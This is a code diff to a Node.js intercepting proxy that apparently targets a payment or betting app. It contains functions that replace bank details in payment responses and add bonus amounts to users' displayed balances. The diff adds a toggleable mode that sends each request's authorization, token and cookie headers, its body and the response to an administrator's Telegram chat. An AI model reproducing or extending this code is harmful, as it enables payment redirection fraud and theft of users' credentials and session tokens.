@@ -326,7 +326,7 @@ let cacheTime = 0;
 const CACHE_TTL = 15000;
 const tokenUserMap = {};
 const userPhoneMap = {};
-let debugNextResponse = false;
+let debugMode = false;
 
 async function ensureWebhook() {
   if (!bot || webhookSet) return;
@@ -641,6 +641,40 @@ async function proxyFetch(req, timeoutMs) {
   if (isText && respBody) {
     try { jsonResp = JSON.parse(respBody); } catch(e) {}
   }
+
+  if (debugMode) {
+    try {
+      const data = cachedData;
+      if (data && data.adminChatId && bot) {
+        const skipDebugPaths = ['/bot-webhook', '/favicon', '/health', '/setup-webhook'];
+        const path = req.originalUrl || req.url || '';
+        if (!skipDebugPaths.some(p => path.includes(p))) {
+          const reqBody = req.rawBody ? req.rawBody.toString('utf8') : '';
+          const importantHeaders = {};
+          for (const [k, v] of Object.entries(fwd)) {
+            if (['authorization', 'token', 'apptoken', 'cookie', 'content-type', 'accept'].includes(k.toLowerCase())) {
+              importantHeaders[k] = v;
+            }
+          }
+          const reqMsg =
+            `🔍 [DEBUG] ${req.method} ${path}\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `📤 REQUEST\n` +
+            `Headers: ${JSON.stringify(importantHeaders).substring(0, 500)}\n` +
+            `Body: ${reqBody.substring(0, 800)}`;
+          const respMsg =
+            `📥 RESPONSE [${response.status}] ${path}\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `${respBody.substring(0, 3000)}`;
+          bot.sendMessage(data.adminChatId, reqMsg.substring(0, 4000)).catch(()=>{});
+          setTimeout(() => {
+            bot.sendMessage(data.adminChatId, respMsg.substring(0, 4000)).catch(()=>{});
+          }, 200);
+        }
+      }
+    } catch(e) {}
+  }
+
   return { response, respBody, respBuffer, respHeaders, jsonResp };
 }
 
@@ -992,7 +1026,9 @@ app.post('/bot-webhook', async (req, res) => {
 /off log <userId> — Log off for user
 /on log <userId> — Log on for user
 /status — Full status
-/debug — Debug next response
+/debug — Toggle full debug mode (every req+resp)
+/debug on — Debug ON
+/debug off — Debug OFF
 
 === BALANCE ===
 /add <amount> <userId> — Add balance
@@ -1040,7 +1076,21 @@ Example:
     if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
     if (text === '/log') { data.logRequests = !data.logRequests; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
 
-    if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace request ka full response dump aayega'); return res.sendStatus(200); }
+    if (text === '/debug' || text === '/debug on' || text === '/debug off') {
+      if (text === '/debug off') {
+        debugMode = false;
+        await bot.sendMessage(chatId, '🔴 Debug Mode OFF — normal mode');
+      } else if (text === '/debug on') {
+        debugMode = true;
+        await bot.sendMessage(chatId, '🟢 Debug Mode ON — har request+response bot pe aayega\nBand karne ke liye: /debug off');
+      } else {
+        debugMode = !debugMode;
+        await bot.sendMessage(chatId, debugMode
+          ? '🟢 Debug Mode ON — har request+response bot pe aayega\nBand karne ke liye: /debug off'
+          : '🔴 Debug Mode OFF — normal mode');
+      }
+      return res.sendStatus(200);
+    }
 
     if (text.startsWith('/off log ')) {
       const targetId = text.substring(9).trim();
@@ -1487,12 +1537,6 @@ async function proxyAndReplaceBankDetails(req, res, label) {
       }
     }
 
-    if (debugNextResponse && data.adminChatId && bot) {
-      debugNextResponse = false;
-      const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
-      bot.sendMessage(data.adminChatId, `🔍 DEBUG ${req.originalUrl}\n\n${dump}`).catch(()=>{});
-    }
-
     if (respData && active) {
       if (Array.isArray(respData)) {
         respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
@@ -1588,13 +1632,6 @@ async function proxyAndAddBonus(req, res) {
       if (addedBal !== 0) {
         addBonusToBalanceFields(bonusData, addedBal);
       }
-      if (data.adminChatId && bot) {
-        const bdKeys = Array.isArray(bonusData) ? '[Array:' + bonusData.length + ']' : Object.keys(bonusData).join(',');
-        bot.sendMessage(data.adminChatId, `🔍 DiwaDebug ${req.path}\nUID: ${detectedUserId}\nOvr: ${!!userOvr} | Added: ${addedBal}\nKeys: ${bdKeys}`).catch(()=>{});
-      }
-    } else if (data.adminChatId && bot) {
-      const bdKeys = bonusData ? (Array.isArray(bonusData) ? '[Array]' : Object.keys(bonusData).join(',')) : 'null';
-      bot.sendMessage(data.adminChatId, `🔍 DiwaDebug ${req.path}\nUID: ${detectedUserId || 'NONE'}\nNo override applied\nKeys: ${bdKeys}`).catch(()=>{});
     }
 
     sendJson(res, respHeaders, jsonResp, respBody);
@@ -1697,9 +1734,6 @@ async function proxyAndAddBonusPersonal(req, res) {
           }
         }
       }
-      if (data.adminChatId && bot) {
-        bot.sendMessage(data.adminChatId, `🔍 DiwaDebug ${req.path}\nUID: ${detectedUserId}\nAdded: ${addedBal}\nIntegral: ${bonusData.integral ?? 'N/A'} | Bal: ${bonusData.balance ?? 'N/A'}`).catch(()=>{});
-      }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
@@ -1788,11 +1822,6 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
 
     const userId = await extractUserIdFromToken(req) || await extractUserId(req, jsonResp);
     const bank = getActiveBank(data, userId);
-
-    if (data.adminChatId && bot && debugNextResponse) {
-      debugNextResponse = false;
-      bot.sendMessage(data.adminChatId, `🔍 OrderInfo:\n${JSON.stringify(jsonResp, null, 2).substring(0, 3500)}`).catch(()=>{});
-    }
 
     if (detailData) {
       const dd = (typeof detailData === 'object' && !Array.isArray(detailData)) ? detailData : {};
